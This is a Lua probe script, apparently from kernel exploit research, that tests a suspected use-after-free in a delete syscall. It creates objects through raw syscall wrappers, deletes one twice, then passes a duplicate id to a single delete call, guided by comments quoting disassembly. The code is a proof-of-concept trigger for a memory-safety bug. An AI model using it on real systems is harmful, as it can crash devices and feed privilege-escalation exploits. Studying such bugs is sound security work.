-- CRASH_CLASS: RISKY
-- PROBE 489c: same id twice in one 662 call, after a successful delete
-- The delete body unlocks (0x3afc67 call 0x399e20) and only then re-reads the
-- slot table (0x3afd0c mov rax,[r12+0x28]; 3afd14 mov r14,[rax+rcx*8]) and the
-- object it frees. If that unlock happens per list entry, one call carrying the
-- same id twice can look the second occurrence up after the first freed it.
-- [A] measures whether a second delete after a clean one still sees the object.
-- [B] hands the same id to one call twice.
print("=== PROBE 489c: duplicate id in one delete ===")
io.stdout:setvbuf("no")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local data = memory.alloc(0x2000)
local out  = memory.alloc(0x100)
local ids  = memory.alloc(0x100)
local res  = memory.alloc(0x400)
local sc669 = make_syscall(669)
local sc662 = make_syscall(662)
local sc664 = make_syscall(664)
for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
local function create()
  for off = 0, 0x100 - 1, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local ok, rv = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
  if not ok then return nil end
  return to_num(memory.read_dword(out))
end
local function poll(id)
  pcall(function() memory.write_dword(ids, id) end)
  local ok, rv = pcall(function() return sc664(uint64(ids), uint64(1), uint64(res)) end)
  return ok and to_num(rv) or -999
end
local function del(list, n)
  for i = 0, n - 1 do pcall(function() memory.write_dword(ids + i * 4, list[i]) end) end
  pcall(function() memory.write_dword(res, 0x42424242) end)
  pcall(function() memory.write_dword(res + 4, 0x42424242) end)
  local ok, rv = pcall(function() return sc662(uint64(ids), uint64(n), uint64(res)) end)
  return ok, ok and to_num(rv) or -999,
         to_num(memory.read_dword(res)), to_num(memory.read_dword(res + 4))
end

print("[A] delete twice")
local a = create()
local pa = poll(a)
local ok, rv, s0 = del({a}, 1)
print(string.format("    id=%d poll_ret=%d delete1 ok=%s ret=%d status=%#x", a, pa, tostring(ok), rv, s0))
local ok2, rv2, s1 = del({a}, 1)
print(string.format("    delete2 ok=%s ret=%d status=%#x", tostring(ok2), rv2, s1))

print("[B] one call, same id twice")
local b = create()
local pb = poll(b)
print(string.format("    id=%d poll_ret=%d", b, pb))
local ok3, rv3, t0, t1 = del({b, b}, 2)
print(string.format("    dup delete ok=%s ret=%d status[0]=%#x status[1]=%#x", tostring(ok3), rv3, t0, t1))
print("=== PROBE 489c COMPLETE ===")
